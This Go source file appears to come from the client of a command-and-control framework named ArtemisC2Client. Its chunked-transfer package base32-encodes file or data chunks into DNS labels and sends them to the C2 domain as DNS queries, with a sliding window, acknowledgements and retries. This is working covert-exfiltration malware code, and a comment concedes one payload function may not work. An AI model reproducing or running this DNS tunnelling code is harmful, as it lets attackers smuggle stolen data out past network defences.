package chunkedtransfer

import (
	"encoding/binary"
	"io"
	"strconv"
	"strings"
	"time"

	"github.com/desertcod98/ArtemisC2Client/dns"
	"github.com/desertcod98/ArtemisC2Client/encoding"
	"github.com/desertcod98/ArtemisC2Client/utils"
)

const (
	jobIdLength = 5
	windowSize  = 5
)

var (
	maxCharacters = ((255-(jobIdLength+len(dns.DomainName)))/64)*63 - 8 // -8 is for the characters needed to store the int32 chunkSeq
	chunkSize     = (maxCharacters * 5) / 8                             //base32 encoding
	timeout, _    = time.ParseDuration("4000ms")
)

type Transfer struct {
	JobId       string
	Reader      io.ReaderAt
	TotalBytes  uint64
	TotalChunks int
	baseSeq     uint32
	nextSeq     uint32
}

func NewTransfer(jobId string, reader io.ReaderAt, totalBytes uint64) Transfer {
	totalChunks := totalBytes/uint64(chunkSize) + 1
	return Transfer{
		JobId:       jobId,
		Reader:      reader,
		TotalBytes:  totalBytes,
		TotalChunks: int(totalChunks),
	}
}

func (t *Transfer) Send() string {
	sendInitialData(t)

	ackChan := make(chan uint32, windowSize)
	timer := time.NewTimer(timeout)
	defer timer.Stop()

	for {
		for (t.nextSeq-t.baseSeq) < windowSize && t.nextSeq < uint32(t.TotalChunks) {
			payloadToSend := getNextPayload(t)
			go func(ackCh chan uint32) {
				res, err := dns.DnsQuery(payloadToSend + "." + t.JobId)
				if err == nil {
					ack, atoiErr := strconv.Atoi(res)
					if atoiErr == nil {
						ackChan <- uint32(ack)
					}
				}
			}(ackChan)

			t.nextSeq++
		}

		select {
		case ack := <-ackChan:
			maxAck := ack

		getMaxAckLoop:
			for {
				select {
				case ack := <-ackChan:
					if ack > maxAck {
						maxAck = ack
					}
				default:
					break getMaxAckLoop
				}
			}
			if maxAck > t.baseSeq {
				t.baseSeq = maxAck
				if !timer.Stop() {
					<-timer.C
				}
				if maxAck == uint32(t.TotalChunks-1) {
					return "ok"
				}
			}
		case <-timer.C:
			t.nextSeq = t.baseSeq
			timer.Reset(timeout)
		}
	}
}

// func getNextPayload(t *Transfer) string {
// 	chunk := make([]byte, chunkSize)
// 	t.Reader.ReadAt(chunk, int64(t.nextSeq)*int64(chunkSize))
// 	chunkStr := encoding.Base32Encode(chunk)
// 	chunkStrArr := utils.SplitStringArrByLength(chunkStr, 63) // DNS labels have max 63 chars each
// 	utils.ReverseStringArr(chunkStrArr)
// 	var seqBytes [4]byte
// 	binary.LittleEndian.PutUint32(seqBytes[:], t.nextSeq)
// 	chunkStrArr = append(chunkStrArr, encoding.Base32Encode(seqBytes[:]))
// 	return strings.Join(chunkStrArr, ".")
// }

// TODO PROBLEM! in my function i do base32encode and then i split the args, because in normal commands
// each arg is encoded by himself (the server needs to know which is which).
// this function is ugly and could not work, just for testing (it splits in chunks and then encodes)
func getNextPayload(t *Transfer) string {
	const maxBytesPerLabel = 39 // 39 bytes -> 63 base32 chars
	chunk := make([]byte, chunkSize)
	t.Reader.ReadAt(chunk, int64(t.nextSeq)*int64(chunkSize))

	var chunkStrArr []string
	for i := 0; i < len(chunk); i += maxBytesPerLabel {
		end := i + maxBytesPerLabel
		if end > len(chunk) {
			end = len(chunk)
		}
		label := encoding.Base32Encode(chunk[i:end])
		chunkStrArr = append(chunkStrArr, label)
	}
	utils.ReverseStringArr(chunkStrArr)
	var seqBytes [4]byte
	binary.LittleEndian.PutUint32(seqBytes[:], t.nextSeq)
	chunkStrArr = append(chunkStrArr, encoding.Base32Encode(seqBytes[:]))
	return strings.Join(chunkStrArr, ".")
}

// Keep trying to send the initial data until the reponse is "ok"
func sendInitialData(t *Transfer) {
	for {
		var totalChunkBytes [4]byte
		binary.LittleEndian.PutUint32(totalChunkBytes[:], uint32(t.TotalChunks))
		req := encoding.Base32Encode(totalChunkBytes[:]) + "." +
			encoding.Base32Encode([]byte("totalchunks")) + "." +
			t.JobId
		res, _ := dns.DnsQuery(req)
		if res == "ok" {
			break
		}
	}
}
